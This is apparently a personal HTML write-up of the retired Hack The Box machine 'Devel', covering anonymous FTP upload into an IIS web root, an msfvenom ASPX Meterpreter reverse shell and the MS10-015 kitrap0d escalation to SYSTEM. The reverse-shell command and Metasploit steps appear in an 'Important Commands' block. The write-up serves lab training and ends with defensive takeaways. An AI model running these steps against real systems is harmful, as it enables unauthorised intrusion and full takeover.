@@ -1,1 +1,199 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8">
+    <title>Devel - HTB Report</title>
+    <link rel="stylesheet" href="../style.css">
+  </head>
 
+  <body>
+    <header>
+      <h1>Devel</h1>
+      <p>Hack The Box Retired Machine Report</p>
+    </header>
+
+    <main class="report">
+      <h2>Machine Info</h2>
+      <p><strong>Difficulty:</strong> Easy</p>
+      <p><strong>Operating System:</strong> Windows</p>
+      <p><strong>Status:</strong> Retired</p>
+      <p><strong>Date Completed:</strong> 30 May 2026</p>
+
+      <h2>Summary</h2>
+      <p>
+        Devel is a beginner-friendly Windows machine that demonstrates the security risks of default or weak service configurations.
+        The machine exposes FTP with anonymous login enabled, and the FTP directory appears to map directly to the web server directory.
+        This allows an attacker to upload an ASPX web shell and gain an initial foothold. Privilege escalation is then performed using
+        a local Windows kernel exploit.
+      </p>
+
+      <h2>Recon / Enumeration</h2>
+      <pre><code>nmap -sC -sV -oN Devel 10.129.6.121</code></pre>
+
+      <table class="report-table">
+        <thead>
+          <tr>
+            <th>Port</th>
+            <th>Service</th>
+            <th>Version</th>
+            <th>Notes</th>
+            <th>Vulnerabilities</th>
+          </tr>
+        </thead>
+
+        <tbody>
+          <tr>
+            <td>21</td>
+            <td>FTP</td>
+            <td>Microsoft ftpd</td>
+            <td>Anonymous login allowed</td>
+            <td>Anonymous file upload</td>
+          </tr>
+
+          <tr>
+            <td>80</td>
+            <td>HTTP</td>
+            <td>Microsoft IIS httpd 7.5</td>
+            <td>Web server running IIS</td>
+            <td>ASPX files executed by the server</td>
+          </tr>
+        </tbody>
+      </table>
+
+      <h2>Initial Foothold</h2>
+      <p>
+        After initial enumeration, ports 21 and 80 were found open. Port 21 was running FTP and allowed anonymous login.
+        Since the FTP directory appeared to be connected to the IIS web root, I tested whether uploaded files could be accessed
+        through the browser.
+      </p>
+
+      <p>
+        After confirming that files uploaded through FTP were reachable over HTTP, I identified that the web server could execute
+        ASPX files. I then used msfvenom to generate an ASPX Meterpreter reverse shell, uploaded it through FTP, and triggered it
+        by visiting the file in the browser. This provided an initial Meterpreter session on the target.
+      </p>
+
+      <h2>Privilege Escalation</h2>
+      <p>
+        After gaining an initial shell, I used Metasploit's local exploit suggester module to identify possible privilege escalation
+        paths on the compromised system.
+      </p>
+
+      <pre><code>post/multi/recon/local_exploit_suggester</code></pre>
+
+      <p>
+        The local exploit suggester returned several possible exploits. The first suggested module was:
+      </p>
+
+      <pre><code>exploit/windows/local/bypassuac_comhijack</code></pre>
+
+      <p>
+        This exploit failed because the current user did not have the required permissions. The next suggested module was:
+      </p>
+
+      <pre><code>exploit/windows/local/bypassuac_eventvwr</code></pre>
+
+      <p>
+        This also failed for the same reason. Another suggested exploit was:
+      </p>
+
+      <pre><code>exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move</code></pre>
+
+      <p>
+        This exploit was not compatible with the target system. Finally, the following module was tested:
+      </p>
+
+      <pre><code>exploit/windows/local/ms10_015_kitrap0d</code></pre>
+
+      <p>
+        This exploit worked successfully and returned a session as:
+      </p>
+
+      <pre><code>NT AUTHORITY\SYSTEM</code></pre>
+
+      <h2>Tools Used</h2>
+      <ul>
+        <li>Nmap</li>
+        <li>FTP</li>
+        <li>curl</li>
+        <li>Google</li>
+        <li>Metasploit</li>
+        <li>msfvenom</li>
+      </ul>
+
+      <h2>Important Commands</h2>
+      <pre><code>nmap -sC -sV -oA Devel 10.129.6.121
+
+ftp 10.129.6.121
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;your-ip&gt; LPORT=4444 -f aspx -o shell.aspx
+
+put shell.aspx
+
+msfconsole
+
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST &lt;your-ip&gt;
+set LPORT 4444
+run
+
+use post/multi/recon/local_exploit_suggester
+set SESSION &lt;session-id&gt;
+run
+
+use exploit/windows/local/ms10_015_kitrap0d
+set SESSION &lt;session-id&gt;
+run
+
+getuid</code></pre>
+
+      <h2>Vulnerabilities / Misconfiguration</h2>
+      <p>
+        The main misconfiguration on this machine was anonymous FTP access. Even worse, the FTP directory appeared to be mapped
+        to the IIS web root, allowing uploaded files to be accessed from the browser. Because IIS supports ASPX execution,
+        this allowed a malicious ASPX file to be uploaded and executed on the server.
+      </p>
+
+      <p>
+        The system was also vulnerable to an older Windows privilege escalation exploit, MS10-015, which allowed the attacker
+        to escalate privileges to NT AUTHORITY\SYSTEM.
+      </p>
+
+      <h2>Defensive Takeaways</h2>
+      <p>
+        Anonymous FTP access should be disabled unless absolutely required. If FTP must be used, uploaded files should not be placed
+        inside a web-accessible directory. Web servers should also restrict executable file uploads such as ASPX, PHP, or other
+        server-side scripts.
+      </p>
+
+      <p>
+        The system should also be kept fully patched to prevent known local privilege escalation vulnerabilities from being exploited.
+        Proper file upload restrictions, least privilege, and regular vulnerability scanning would have reduced the risk on this machine.
+      </p>
+
+      <h2>Lessons Learned</h2>
+      <p>
+        This machine helped reinforce the importance of checking how services interact with each other. FTP by itself may not always
+        lead to code execution, but when it is connected to a web server directory, it can become a serious vulnerability.
+      </p>
+
+      <p>
+        I learned how to use msfvenom to generate a payload that matched the target web server. Since the server was running IIS
+        and could execute ASPX files, I was able to create an ASPX reverse shell, upload it through FTP, and trigger it from the browser.
+      </p>
+
+      <p>
+        I also learned how to use different modules within Metasploit Framework. After getting an initial session, I used a handler
+        to catch the reverse shell, the local exploit suggester module to identify possible privilege escalation paths, and then tested
+        different local exploit modules until one successfully gave SYSTEM access.
+      </p>
+
+      <p>
+        Not every suggested exploit will work, so it is important to understand why an exploit fails and continue testing other options.
+      </p>
+
+      <p><a href="../index.html">Back to all reports</a></p>
+    </main>
+  </body>
+</html>
